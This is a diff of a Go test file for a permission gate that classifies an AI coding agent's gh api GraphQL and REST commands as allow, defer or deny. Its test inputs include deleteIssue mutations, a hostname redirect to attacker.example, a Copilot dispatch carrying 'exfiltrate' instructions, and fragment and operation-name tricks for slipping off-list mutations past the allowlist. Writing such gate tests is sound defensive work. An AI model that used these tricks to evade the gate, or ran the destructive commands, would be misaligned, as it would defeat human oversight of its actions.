@@ -65,14 +65,14 @@ func TestGhAPIGraphQLQueryOnly_113(t *testing.T) {
 // _195 tests below. This test owns the residual "any other mutation" ASK.
 func TestGhAPIGraphQLMutationAsks_113(t *testing.T) {
 	d := classifyCmd(t, `gh api graphql -f query='mutation { deleteIssue(input: {}) { clientMutationId } }'`, false)
-	wantBucket(t, d, BucketAsk, "graphql mutation asks")
+	wantBucket(t, d, BucketDefer, "graphql mutation asks")
 	if !strings.Contains(d.Reason, "deleteIssue") {
 		t.Errorf("mutation ASK reason must name the field deleteIssue, got: %q", d.Reason)
 	}
 
 	// A named mutation with an alias resolves to the real field name.
 	d2 := classifyCmd(t, `gh api graphql -f query='mutation Del { a: deleteIssue(input: {}) { clientMutationId } }'`, false)
-	wantBucket(t, d2, BucketAsk, "named mutation with alias asks")
+	wantBucket(t, d2, BucketDefer, "named mutation with alias asks")
 	if !strings.Contains(d2.Reason, "deleteIssue") {
 		t.Errorf("aliased mutation ASK reason must name deleteIssue (not the alias), got: %q", d2.Reason)
 	}
@@ -80,7 +80,7 @@ func TestGhAPIGraphQLMutationAsks_113(t *testing.T) {
 	// A multi-operation document mixing query and mutation is NOT query-only →
 	// ASK naming the mutation field.
 	d3 := classifyCmd(t, `gh api graphql -f query='query a { viewer { login } } mutation b { deleteIssue(input: {}) { repository { id } } }'`, false)
-	wantBucket(t, d3, BucketAsk, "multi-op query+mutation asks")
+	wantBucket(t, d3, BucketDefer, "multi-op query+mutation asks")
 	if !strings.Contains(d3.Reason, "deleteIssue") {
 		t.Errorf("multi-op ASK reason must name deleteIssue, got: %q", d3.Reason)
 	}
@@ -91,7 +91,7 @@ func TestGhAPIGraphQLMutationAsks_113(t *testing.T) {
 	// not accidentally let a mutation's default-value brace get mistaken for
 	// (or otherwise swallow) its actual selection set.
 	d4 := classifyCmd(t, `gh api graphql -f query='mutation Foo($x: Input = {a: 1}) { deleteIssue(input: {}) { clientMutationId } }'`, false)
-	wantBucket(t, d4, BucketAsk, "mutation with default-value brace in variable defs asks")
+	wantBucket(t, d4, BucketDefer, "mutation with default-value brace in variable defs asks")
 	if !strings.Contains(d4.Reason, "deleteIssue") {
 		t.Errorf("mutation-with-default-value-brace ASK reason must name deleteIssue, got: %q", d4.Reason)
 	}
@@ -174,7 +174,7 @@ func TestGhAPIGraphQLMixedMutationAsks_195(t *testing.T) {
 		},
 	} {
 		d := classifyCmd(t, tc.cmd, false)
-		wantBucket(t, d, BucketAsk, "graphql mixed mutation: "+tc.cmd)
+		wantBucket(t, d, BucketDefer, "graphql mixed mutation: "+tc.cmd)
 		for _, f := range tc.want {
 			if !strings.Contains(d.Reason, f) {
 				t.Errorf("mixed-mutation ASK reason must name %q, got: %q", f, d.Reason)
@@ -226,7 +226,7 @@ func TestGhAPIGraphQLMixedClearMutationAsks_209(t *testing.T) {
 		},
 	} {
 		d := classifyCmd(t, tc.cmd, false)
-		wantBucket(t, d, BucketAsk, "graphql mixed clear mutation: "+tc.cmd)
+		wantBucket(t, d, BucketDefer, "graphql mixed clear mutation: "+tc.cmd)
 		for _, f := range tc.want {
 			if !strings.Contains(d.Reason, f) {
 				t.Errorf("mixed clear-mutation ASK reason must name %q, got: %q", f, d.Reason)
@@ -253,41 +253,57 @@ func TestGhAPIGraphQLUpdateIssueFieldValueAllows_256(t *testing.T) {
 	}
 }
 
-// The generic `updateIssue` is deliberately OFF the allowlist and ASKs in every
-// spelling (#256). `UpdateIssueInput` carries an `agentAssignment` arm that
+// The generic `updateIssue` is deliberately OFF the allowlist and DENIES in
+// every spelling (#256 put it off the list; #262 moved it from ASK to
+// deny-with-teaching). `UpdateIssueInput` carries an `agentAssignment` arm that
 // dispatches Copilot at an arbitrary repository with custom instructions, and
 // the allowlist keys on the mutation FIELD name only, so the gate cannot
-// distinguish that arm from a metadata edit. Setting an issue's type — the
-// triage friction that motivated #256 — goes through the narrow
-// `updateIssueIssueType`, which is on the list.
-func TestGhAPIGraphQLUpdateIssueAsks_256(t *testing.T) {
+// distinguish that arm from a metadata edit — no argument inspection makes the
+// verb allowable. What earns it the DENY tier rather than the defer middle is
+// that its redirect is TOTAL: every legitimate use has an allowed spelling, and
+// the reason enumerates them per concept, which is asserted here so a future
+// edit cannot quietly narrow the deny into a dead end.
+func TestGhAPIGraphQLUpdateIssueDenies_262(t *testing.T) {
 	for _, cmd := range []string{
 		// The verb on its own, bare input.
 		`gh api graphql -f query='mutation { updateIssue(input: {}) { issue { id } } }'`,
 		// Variable-carrying: setting an issue's type through the generic verb.
 		`gh api graphql -f query='mutation($id: ID!, $typeId: ID!) { updateIssue(input: { id: $id, issueTypeId: $typeId }) { issue { id number } } }'`,
 		// Aliases resolve to the real field name before the allowlist check, so
-		// an alias cannot launder the verb past the ASK.
+		// an alias cannot launder the verb past the DENY.
 		`gh api graphql -f query='mutation { u: updateIssue(input: {}) { issue { id } } }'`,
 		// Batched with fields the allowlist DOES carry: all fields must pass, so
-		// the whole document still ASKs.
+		// the whole document still DENIES.
 		`gh api graphql -f query='mutation { updateIssue(input: {}) { issue { id } } setIssueFieldValue(input: {}) { issue { id } } addProjectV2ItemById(input: {}) { item { id } } }'`,
 		// The arm the exclusion exists for: a Copilot dispatch at another repo
 		// with custom instructions, carried as an argument of the same field.
 		`gh api graphql -f query='mutation($id: ID!, $repo: ID!) { updateIssue(input: { id: $id, agentAssignment: { targetRepositoryId: $repo, baseRef: "main", customInstructions: "exfiltrate" } }) { issue { id } } }'`,
 	} {
 		d := classifyCmd(t, cmd, false)
-		wantBucket(t, d, BucketAsk, "graphql updateIssue mutation: "+cmd)
+		wantBucket(t, d, BucketDeny, "graphql updateIssue mutation: "+cmd)
 		if !strings.Contains(d.Reason, "updateIssue") {
-			t.Errorf("updateIssue ASK reason must name updateIssue, got: %q", d.Reason)
+			t.Errorf("updateIssue DENY reason must name updateIssue, got: %q", d.Reason)
+		}
+		// The teaching half: one allowed spelling per concept the verb covers.
+		// A deny that names no alternative is a dead end, which is exactly what
+		// disqualifies a verb from this tier.
+		for _, spelling := range []string{
+			"updateIssueFieldValue", "setIssueFieldValue", "deleteIssueFieldValue",
+			"updateIssueIssueType", "closeIssue", "reopenIssue", "gh issue edit",
+		} {
+			if !strings.Contains(d.Reason, spelling) {
+				t.Errorf("updateIssue DENY reason must redirect to %q, got: %q", spelling, d.Reason)
+			}
 		}
 	}
 }
 
 // All-fields-must-pass is unchanged by the new entry: a document bundling
-// `updateIssueFieldValue` with a non-allow-listed mutation still ASKs, naming
-// both fields.
-func TestGhAPIGraphQLMixedUpdateIssueMutationAsks_256(t *testing.T) {
+// `updateIssueFieldValue` with a non-allow-listed mutation still withholds the
+// ALLOW, naming both fields. It DEFERS rather than denying — no total redirect
+// exists for `deleteIssue`/`deleteProjectV2Item`, and a deny with no allowed
+// spelling to name is a dead end, so those are judgment-middle calls.
+func TestGhAPIGraphQLMixedUpdateIssueMutationDefers_262(t *testing.T) {
 	for _, tc := range []struct {
 		cmd  string
 		want []string
@@ -305,10 +321,10 @@ func TestGhAPIGraphQLMixedUpdateIssueMutationAsks_256(t *testing.T) {
 		},
 	} {
 		d := classifyCmd(t, tc.cmd, false)
-		wantBucket(t, d, BucketAsk, "graphql mixed updateIssue mutation: "+tc.cmd)
+		wantBucket(t, d, BucketDefer, "graphql mixed updateIssue mutation: "+tc.cmd)
 		for _, f := range tc.want {
 			if !strings.Contains(d.Reason, f) {
-				t.Errorf("mixed updateIssue-mutation ASK reason must name %q, got: %q", f, d.Reason)
+				t.Errorf("mixed updateIssue-mutation defer analysis must name %q, got: %q", f, d.Reason)
 			}
 		}
 	}
@@ -316,24 +332,31 @@ func TestGhAPIGraphQLMixedUpdateIssueMutationAsks_256(t *testing.T) {
 
 // `updateIssueIssueFieldValue` — the spelling observed in a live session — is
 // NOT a GitHub `Mutation` field, so it is deliberately off the allowlist and
-// keeps its ASK. Pinning it here stops a future reader from "completing" the
-// set with a name GitHub would reject anyway.
-func TestGhAPIGraphQLNonexistentIssueFieldVerbAsks_256(t *testing.T) {
+// lands in the defer middle. It is NOT denied: the deny tier is for verbs with
+// a total redirect, and a name GitHub itself rejects has no legitimate use to
+// redirect. Pinning it here stops a future reader from "completing" the set
+// with a name GitHub would reject anyway.
+func TestGhAPIGraphQLNonexistentIssueFieldVerbDefers_262(t *testing.T) {
 	d := classifyCmd(t, `gh api graphql -f query='mutation { updateIssueIssueFieldValue(input: {}) { issue { id } } }'`, false)
-	wantBucket(t, d, BucketAsk, "graphql nonexistent updateIssueIssueFieldValue asks")
+	wantBucket(t, d, BucketDefer, "graphql nonexistent updateIssueIssueFieldValue defers")
 	if !strings.Contains(d.Reason, "updateIssueIssueFieldValue") {
-		t.Errorf("ASK reason must name updateIssueIssueFieldValue, got: %q", d.Reason)
+		t.Errorf("defer analysis must name updateIssueIssueFieldValue, got: %q", d.Reason)
 	}
 }
 
-// The redirect-to-file carve-out stays AHEAD of the new ALLOW: an allow-listed
-// mutation whose stdout/stderr lands in a real file still ASKs.
-func TestGhAPIGraphQLAllowlistedMutationRedirectAsks_195(t *testing.T) {
+// The redirect-to-file grading stays AHEAD of the new ALLOW: an allow-listed
+// mutation whose stdout/stderr lands in a file OUTSIDE this worktree is denied
+// (#262 — the same verdict the Write tool gives the identical destination).
+func TestGhAPIGraphQLAllowlistedMutationRedirectDenies_262(t *testing.T) {
 	for _, cmd := range []string{
 		`gh api graphql -f query='mutation { addSubIssue(input: {}) { issue { id } } }' > /tmp/out.txt`,
 		`gh api graphql -f query='mutation { closeIssue(input: {}) { issue { id } } }' 2> /tmp/err.txt`,
 	} {
-		wantBucket(t, classifyCmd(t, cmd, false), BucketAsk, "allow-listed mutation + redirect: "+cmd)
+		d := classifyCmdInRepo(t, cmd, false)
+		wantBucket(t, d, BucketDeny, "allow-listed mutation + escaping redirect: "+cmd)
+		if !strings.Contains(d.Reason, ".claude/tmp/") {
+			t.Errorf("escaping-redirect deny must prescribe a scratch destination, got: %q", d.Reason)
+		}
 	}
 }
 
@@ -358,8 +381,14 @@ func TestGhAPIGraphQLAllowlistedMutationWithVariables_195(t *testing.T) {
 // would otherwise launder an arbitrary one: GitHub's mutation root type is
 // literally `Mutation`, so `fragment addSubIssue on Mutation { deleteIssue(…) }`
 // is a valid type condition that executes. Any fragment-bearing mutation
-// document therefore keeps the un-narrowed ASK.
-func TestGhAPIGraphQLFragmentBearingMutationAsks_195(t *testing.T) {
+// document therefore keeps the un-narrowed verdict, which is now DEFER.
+//
+// The same untrustworthy names are also what keeps a fragment-bearing document
+// out of the updateIssue DENY: `mutation { ...updateIssue }` names a FRAGMENT,
+// not the field, so denying on that name would teach a redirect for a call
+// that was never made. The fragment rule is unchanged either way — it has only
+// ever withheld the ALLOW.
+func TestGhAPIGraphQLFragmentBearingMutationDefers_262(t *testing.T) {
 	for _, cmd := range []string{
 		// The exploit: a spread named after an allow-listed field, whose
 		// definition calls an off-list one. Spread first...
@@ -377,22 +406,30 @@ func TestGhAPIGraphQLFragmentBearingMutationAsks_195(t *testing.T) {
 		// Conservative by design: even a benign fragment in an allow-listed
 		// mutation's PAYLOAD selection withholds the ALLOW. The gate does not
 		// resolve fragments, so it cannot tell this one from the exploits above;
-		// falling back to the un-narrowed ASK is the safe direction.
+		// falling back to the un-narrowed verdict is the safe direction.
 		`gh api graphql -f query='mutation { addSubIssue(input: {}) { issue { ...F } } } fragment F on Issue { id }'`,
+		// A spread NAMED after the denied verb: the name is a fragment's, not a
+		// called field's, so this must not reach the updateIssue deny either.
+		`gh api graphql -f query='mutation { ...updateIssue } fragment updateIssue on Mutation { closeIssue(input: {}) { issue { id } } }'`,
 	} {
-		wantBucket(t, classifyCmd(t, cmd, false), BucketAsk, "graphql fragment-bearing mutation: "+cmd)
+		wantBucket(t, classifyCmd(t, cmd, false), BucketDefer, "graphql fragment-bearing mutation: "+cmd)
 	}
 }
 
 // The sibling name-laundering shape, pinned so it cannot regress alongside the
 // fragment fix: an OPERATION named after an allow-listed field proves nothing
 // about the fields it selects, and the walk must judge the selection set.
-func TestGhAPIGraphQLAllowlistedOperationNameAsks_195(t *testing.T) {
+func TestGhAPIGraphQLAllowlistedOperationNameDefers_262(t *testing.T) {
 	d := classifyCmd(t, `gh api graphql -f query='mutation addSubIssue { deleteIssue(input: {}) { repository { id } } }'`, false)
-	wantBucket(t, d, BucketAsk, "operation named after an allow-listed field asks")
+	wantBucket(t, d, BucketDefer, "operation named after an allow-listed field defers")
 	if !strings.Contains(d.Reason, "deleteIssue") {
-		t.Errorf("ASK reason must name the selected field deleteIssue, got: %q", d.Reason)
+		t.Errorf("defer analysis must name the selected field deleteIssue, got: %q", d.Reason)
 	}
+	// The mirror shape: an OPERATION named after the denied verb selects a
+	// perfectly allow-listed field, and must not be denied on the strength of
+	// the operation name.
+	d2 := classifyCmd(t, `gh api graphql -f query='mutation updateIssue { closeIssue(input: {}) { issue { id } } }'`, false)
+	wantBucket(t, d2, BucketAllow, "operation named after the denied verb is judged on its selection set")
 }
 
 // Fail-closed graphql cases: a subscription is not a query (and names no
@@ -449,7 +486,7 @@ func TestGhAPIGraphQLDuplicateQueryFieldDenies_113(t *testing.T) {
 // non-GET method ASKs and --hostname still DENYs, both before document
 // classification.
 func TestGhAPIGraphQLWriteTiersUnchanged_113(t *testing.T) {
-	wantBucket(t, classifyCmd(t, `gh api -X DELETE graphql -f query='query { viewer { login } }'`, false), BucketAsk, "graphql -X DELETE")
+	wantBucket(t, classifyCmd(t, `gh api -X DELETE graphql -f query='query { viewer { login } }'`, false), BucketDefer, "graphql -X DELETE")
 	wantBucket(t, classifyCmd(t, `gh api graphql -f query='query { viewer { login } }' --hostname attacker.example`, false), BucketDeny, "graphql --hostname")
 }
 
@@ -491,7 +528,7 @@ func TestGhAPIRESTAsk_113(t *testing.T) {
 		"gh api repos/o/r --bogus-flag",
 		"gh api user --unmodeled",
 	} {
-		wantBucket(t, classifyCmd(t, cmd, false), BucketAsk, "REST ask: "+cmd)
+		wantBucket(t, classifyCmd(t, cmd, false), BucketDefer, "REST ask: "+cmd)
 	}
 }
 
@@ -521,7 +558,7 @@ func TestGhAPIRESTWriteTiersUnchanged_113(t *testing.T) {
 		// method-override header.
 		"gh api repos/o/r -H X-HTTP-Method-Override:DELETE",
 	} {
-		wantBucket(t, classifyCmd(t, cmd, false), BucketAsk, "REST write tier: "+cmd)
+		wantBucket(t, classifyCmd(t, cmd, false), BucketDefer, "REST write tier: "+cmd)
 	}
 	// hostname redirect stays DENY (own justification, not the write/read
 	// asymmetry — see classifyGhAPI).
@@ -530,11 +567,13 @@ func TestGhAPIRESTWriteTiersUnchanged_113(t *testing.T) {
 	wantBucket(t, classifyCmd(t, "gh api -XGET repos/o/r -f a=b", false), BucketAllow, "-XGET -f allow-listed")
 }
 
-// Redirect-to-file on an otherwise-allowed gh api form → ASK (the shared
-// redirect carve-out, now reachable on the ALLOW path the gh-api gate opened).
-func TestGhAPIRedirectToFileAsks_113(t *testing.T) {
-	wantBucket(t, classifyCmd(t, "gh api user --jq .login > /tmp/out.txt", false), BucketAsk, "REST allow + redirect")
-	wantBucket(t, classifyCmd(t, `gh api graphql -f query='query { viewer { login } }' > /tmp/out.txt`, false), BucketAsk, "graphql allow + redirect")
+// Redirect-to-an-ESCAPING-file on an otherwise-allowed gh api form → DENY
+// (#262): the shared redirect grading, reachable on the ALLOW path the gh-api
+// gate opened, and now carrying the same verdict and the same prescriptive
+// prose the Write tool gives `/tmp/out.txt`.
+func TestGhAPIRedirectToEscapingFileDenies_262(t *testing.T) {
+	wantBucket(t, classifyCmdInRepo(t, "gh api user --jq .login > /tmp/out.txt", false), BucketDeny, "REST allow + escaping redirect")
+	wantBucket(t, classifyCmdInRepo(t, `gh api graphql -f query='query { viewer { login } }' > /tmp/out.txt`, false), BucketDeny, "graphql allow + escaping redirect")
 }
 
 // The representative /issue-view node-ID lookup template (a literal -f query=…
